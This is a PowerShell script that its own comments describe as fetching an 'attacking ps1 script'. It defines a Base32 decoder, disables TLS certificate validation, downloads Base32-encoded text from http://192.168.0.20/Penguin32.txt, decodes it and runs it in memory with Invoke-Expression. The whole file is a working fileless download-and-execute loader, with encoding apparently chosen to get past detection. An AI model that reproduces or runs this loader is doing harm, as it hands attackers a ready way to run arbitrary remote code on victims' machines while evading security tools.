# Base32 Decoding function
function Decode-Base32 {
    param(
        [Parameter(Mandatory=$true)]
        [string]$EncodedText
    )

    $encodedChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    $byteOutput = New-Object byte[]([math]::ceiling($EncodedText.Length * 5 / 8))
    $byteCount = 0
    $buffer = 0
    $bitsRemaining = 0

    foreach ($c in $EncodedText.ToUpper().ToCharArray()) {
        $value = [array]::IndexOf($EncodedChars.ToCharArray(), $c)
        if ($value -eq -1) {
            throw "Invalid Base32 character '$c'"
        }
        $buffer = ($buffer -shl 5) -bor $value
        $bitsRemaining += 5

        if ($bitsRemaining -ge 8) {
            $byteOutput[$byteCount++] = [byte]($buffer -shr ($bitsRemaining - 8))
            $bitsRemaining -= 8
            $buffer = $buffer -band ([math]::pow(2, $bitsRemaining) - 1)
        }
    }

    return ,$byteOutput[0..($byteCount - 1)]
}

# SSL/TLS configuration
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Specify URL from which attacking ps1 script is downloaded
$fileUrl = "http://192.168.0.20/Penguin32.txt"

# DL the file and execute it on memory
try {
    $webClient = New-Object System.Net.WebClient
    $encodedData = $webClient.DownloadString($fileUrl)

    # Remove illegitimate charactors
    $encodedData = $encodedData -replace "[^A-Z2-7]", ""

    $decodedBytes = Decode-Base32 $encodedData

    # execute the file on memory
    Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decodedBytes))
}
catch {
    Write-Host "Error when downloading or executing the file: $_"
}
finally {
    $webClient.Dispose()
}
